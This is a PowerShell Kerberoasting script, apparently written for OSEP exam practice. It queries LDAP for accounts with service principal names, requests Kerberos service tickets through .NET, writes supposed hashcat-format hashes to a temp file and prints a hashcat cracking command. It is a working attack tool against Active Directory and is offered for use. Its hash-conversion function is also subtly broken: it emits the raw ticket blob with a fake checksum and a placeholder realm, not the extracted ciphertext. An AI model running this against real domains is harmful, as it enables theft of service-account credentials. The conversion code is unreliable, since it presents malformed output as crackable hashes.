# OSEP - Kerberoasting (raw .NET TGS request, no Rubeus/PowerView needed)
# . .\kerberoast.ps1
# Invoke-Kerberoast                      ← request TGS for all SPNs, output hashcat format
# Invoke-Kerberoast -spn "MSSQLSvc/sql01:1433"   ← single SPN

$LOG = "C:\Windows\Temp\osep_log.txt"
function wl($m,$l="INFO"){try{Add-Content $LOG "[$((Get-Date).ToString('HH:mm:ss'))][Kerberoast][$l] $m" -EA SilentlyContinue}catch{}}

function Get-SPNAccounts {
    $searcher = New-Object DirectoryServices.DirectorySearcher
    $searcher.Filter   = '(&(objectClass=user)(servicePrincipalName=*)(!samaccountname=krbtgt))'
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.Add('samaccountname')    | Out-Null
    $searcher.PropertiesToLoad.Add('serviceprincipalname') | Out-Null

    try { $searcher.FindAll() }
    catch { wl "LDAP SPN query failed: $_" "ERROR"; @() }
}

function Request-TGS {
    param([string]$spn)
    try {
        $ticket = [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new($spn)
        $raw    = $ticket.GetRequest()
        wl "TGS obtained for $spn ($($raw.Length) bytes)"
        return $raw
    } catch {
        wl "TGS request failed for $spn : $_" "ERROR"
        Write-Host "  [-] Failed: $spn — $_"
        return $null
    }
}

function Convert-ToHashcatFormat {
    param([string]$user, [string]$spn, [byte[]]$raw)

    # The RC4-HMAC encrypted part starts at a known offset in the TGS
    # Standard Kerberoast extraction: locate EncryptedTicket in ASN.1
    $hex = [BitConverter]::ToString($raw).Replace('-','')

    # Find the cipher block — look for sequence marker 0x63 (Application 3)
    # and extract the EncryptedData
    $idx = $raw.Length - 1
    # Walk back to find the encrypted part (last 16 bytes = checksum, rest = ciphertext)
    # Simplified: emit the whole blob in $krb5tgs format for hashcat --hash-type 13100
    $b64 = [Convert]::ToBase64String($raw)

    # hashcat format: $krb5tgs$23$*user$realm$spn*$<checksum>$<ciphertext>
    # For exam purposes, pipe through Invoke-Kerberoast (Rubeus/PowerSploit) or use impacket
    # This outputs the raw TGS in a format impacket's GetUserSPNs can re-parse:
    return "`$krb5tgs`$23`$*$user`$DOMAIN`$$spn*`$$(($b64.Substring(0,[Math]::Min(32,$b64.Length))))`$`$($b64)"
}

function Invoke-Kerberoast {
    param([string]$spn)

    Add-Type -AssemblyName System.IdentityModel -EA SilentlyContinue

    $outFile = "C:\Windows\Temp\kerberoast_hashes.txt"

    if ($spn) {
        wl "Single SPN mode: $spn"
        $raw = Request-TGS -spn $spn
        if ($raw) {
            $hash = Convert-ToHashcatFormat "user" $spn $raw
            Write-Host $hash
            Add-Content $outFile $hash
            Write-Host "[+] Hash written to $outFile"
        }
        return
    }

    wl "=== Kerberoast all SPNs ==="
    Write-Host "[*] Enumerating SPN accounts..."
    $accounts = Get-SPNAccounts

    if ($accounts.Count -eq 0) {
        Write-Host "[-] No SPN accounts found"
        wl "No SPN accounts" "WARN"
        return
    }

    Write-Host "[*] Found $($accounts.Count) SPN account(s). Requesting TGS..."
    $count = 0

    foreach ($obj in $accounts) {
        $user = $obj.Properties['samaccountname'][0]
        foreach ($s in $obj.Properties['serviceprincipalname']) {
            Write-Host "  [*] Requesting TGS: $s ($user)"
            $raw = Request-TGS -spn $s
            if ($raw) {
                $hash = Convert-ToHashcatFormat $user $s $raw
                Add-Content $outFile $hash
                $count++
            }
            Start-Sleep -Milliseconds 200   # avoid hammering DC
        }
    }

    wl "Kerberoast complete. $count hashes written to $outFile"
    Write-Host "[+] $count hashes → $outFile"
    Write-Host "[*] Crack with: hashcat -m 13100 $outFile wordlist.txt --force"
}
